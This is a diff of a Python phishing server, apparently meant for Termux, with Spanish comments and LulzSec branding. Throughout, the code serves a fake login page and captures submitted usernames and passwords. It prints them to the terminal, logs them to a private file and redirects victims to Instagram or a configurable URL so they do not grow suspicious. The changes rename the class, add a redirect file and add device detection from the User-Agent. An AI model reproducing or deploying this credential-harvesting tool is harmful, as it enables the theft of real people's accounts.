@@ -3,19 +3,17 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from datetime import datetime
 import os
 
-# --- Configuración de Estética (Colores ANSI) ---
-GREEN = "\033[38;5;46m"
-RED = "\033[38;5;196m"
-CYAN = "\033[38;5;51m"
-YELLOW = "\033[38;5;226m"
-BOLD = "\033[1m"
-NC = "\033[0m" # Sin color
+# --- COLORES HACKER ---
+G = "\033[38;5;46m"  # Verde Matrix
+R = "\033[38;5;196m" # Rojo Alerta
+C = "\033[38;5;51m"  # Cian
+Y = "\033[38;5;226m" # Amarillo
+W = "\033[1;37m"     # Blanco Brillante
+NC = "\033[0m"       # Reset
 
-class AndyTechnologyServer(BaseHTTPRequestHandler):
+class AndyLulzSecServer(BaseHTTPRequestHandler):
     
-    def log_message(self, format, *args):
-        # Desactivar los logs aburridos del servidor por defecto
-        return
+    def log_message(self, format, *args): return # Silenciar logs de fondo
 
     def do_GET(self):
         if self.path == '/':
@@ -26,85 +24,81 @@ class AndyTechnologyServer(BaseHTTPRequestHandler):
                     self.end_headers()
                     self.wfile.write(f.read())
             except FileNotFoundError:
-                self.send_error(404, "ERROR: index.html missing.")
+                self.send_error(404, "index.html no encontrado")
         else:
             self.send_response(404)
             self.end_headers()
 
     def do_POST(self):
-        # 1. Obtener longitud y leer datos
+        # 1. Leer datos recibidos
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
-        
-        # 2. Parsear datos (aquí es donde extraemos user y pass)
         datos = urllib.parse.parse_qs(post_data)
         
-        # Buscamos los nombres exactos que pusiste en tu HTML
-        usuario = datos.get('user_id', ['<EMPTY>'])[0]
-        password = datos.get('user_pass', ['<EMPTY>'])[0]
+        usuario = datos.get('user_id', ['<VACIO>'])[0]
+        password = datos.get('user_pass', ['<VACIO>'])[0]
         
-        fecha = datetime.now().strftime("%Y-%m-%d | %H:%M:%S")
-        ip_cliente = self.client_address[0]
-        user_agent = self.headers.get('User-Agent', 'Unknown Browser')
+        # 2. Detectar Sistema Operativo
+        agent = self.headers.get('User-Agent', 'Desconocido')
+        device = "PC/Web"
+        if "Android" in agent: device = "Android"
+        elif "iPhone" in agent: device = "iPhone/iOS"
 
-        # 3. EFECTO VISUAL EN TERMINAL (Lo que verás en Termux)
-        print(f"\n{RED}{BOLD}[!] ALERTA: CONEXIÓN RECIBIDA [!]{NC}")
-        print(f"{CYAN}--------------------------------------------------{NC}")
-        print(f"{YELLOW}FECHA   :{NC} {fecha}")
-        print(f"{YELLOW}IP      :{NC} {ip_cliente}")
-        print(f"{YELLOW}BROWSER :{NC} {user_agent[:50]}...")
-        print(f"{GREEN}{BOLD}USUARIO :{NC} {BOLD}{usuario}{NC}")
-        print(f"{GREEN}{BOLD}PASS    :{NC} {BOLD}{password}{NC}")
-        print(f"{CYAN}--------------------------------------------------{NC}")
+        # 3. Lógica de Redirección Personalizada
+        # Si el archivo redireccion.txt existe, lee la URL de ahí
+        url_destino = "https://www.instagram.com" 
+        if os.path.exists("redireccion.txt"):
+            with open("redireccion.txt", "r") as f:
+                url_destino = f.read().strip()
 
-        # 4. Guardar en el Log con la firma de Andy Tech
-        reporte = (
-            f"╔═════════════════════════════════════════════════════╗\n"
-            f"  ANDY TECHNOLOGY - LOG CAPTURE\n"
-            f"  Fecha: {fecha}\n"
-            f"  IP   : {ip_cliente}\n"
-            f"  User : {usuario}\n"
-            f"  Pass : {password}\n"
-            f"╚═════════════════════════════════════════════════════╝\n\n"
-        )
+        fecha = datetime.now().strftime("%H:%M:%S")
 
-        try:
-            with open("registro_privado.txt", "a", encoding="utf-8") as f:
-                f.write(reporte)
-        except Exception as e:
-            print(f"{RED}[-] Error escribiendo log: {e}{NC}")
+        # --- REPORTE EN PANTALLA ---
+        print(f"\n{R} [!] ALERTA: PEZ CAPTURADO EN LA RED [!]{NC}")
+        print(f"{G}╔══════════════════════════════════════════════════╗{NC}")
+        print(f"{G}║ {W}HORA     :{NC} {fecha}")
+        print(f"{G}║ {W}SISTEMA  :{NC} {device}")
+        print(f"{G}║ {W}USUARIO  :{NC} {Y}{usuario}{NC}")
+        print(f"{G}║ {W}PASSWORD :{NC} {Y}{password}{NC}")
+        print(f"{G}║ {W}REDIRECT :{NC} {C}{url_destino}{NC}")
+        print(f"{G}╚══════════════════════════════════════════════════╝{NC}")
 
-        # 5. Redirigir para no levantar sospechas
+        # Guardar en log
+        with open("registro_privado.txt", "a") as f:
+            f.write(f"[{fecha}] Dev: {device} | User: {usuario} | Pass: {password} | Target: {url_destino}\n")
+
+        # Redirigir al usuario
         self.send_response(301)
-        self.send_header('Location', 'https://www.instagram.com')
+        self.send_header('Location', url_destino)
         self.end_headers()
 
-def iniciar_servidor():
-    puerto = 8080
-    servidor = HTTPServer(('0.0.0.0', puerto), AndyTechnologyServer)
-    
-    # --- Banner de Bienvenida Estilo Hacker ---
+def iniciar():
     os.system('clear')
-    print(f"""{GREEN}{BOLD}
-    █████╗ ███╗   ██╗██████╗ ██╗   ██╗
-    ██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝
-    ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ 
-    ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  
-    ██║  ██║██║ ╚████║██████╔╝   ██║   
-    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   
-    {NC}{CYAN}      SYSTEMS & TECHNOLOGY v2.0{NC}
-    {BOLD}----------------------------------------{NC}
-    {YELLOW}[*]{NC} SERVIDOR : {GREEN}ONLINE{NC}
-    {YELLOW}[*]{NC} PUERTO   : {GREEN}{puerto}{NC}
-    {YELLOW}[*]{NC} ESTADO   : {GREEN}ESCUCHANDO PAQUETES...{NC}
-    {BOLD}----------------------------------------{NC}
+    # --- LOGO LULZSEC EN ASCII ---
+    print(f"""{W}
+                .---.
+               /     \\
+              | () () |   {G}ANDY TECHNOLOGY{W}
+               \\  ^  /    {C}LulzSec Edition{W}
+                |||||
+           记录 .---. 记录
+          /  /     \\  \\
+         |  |       |  |
+         \\  \\       /  /
+          \\  '---'  /
+           '-------'
+    {G}  Lulz Security - Laughing at your security
+    {NC}{G}------------------------------------------
+    {Y}[*]{NC} ESTADO   : {G}SISTEMA ACTIVO{NC}
+    {Y}[*]{NC} REDIRECT : {C}Ver redireccion.txt{NC}
+    {Y}[*]{NC} PUERTO   : {W}8080{NC}
+    {G}------------------------------------------{NC}
     """)
     
     try:
-        servidor.serve_forever()
+        HTTPServer(('0.0.0.0', 8080), AndyLulzSecServer).serve_forever()
     except KeyboardInterrupt:
-        print(f"\n{RED}[!] Apagando Sistemas...{NC}")
-        servidor.server_close()
+        print(f"\n{R}[!] Saliendo de las sombras...{NC}")
 
 if __name__ == "__main__":
-    iniciar_servidor()
+    iniciar()
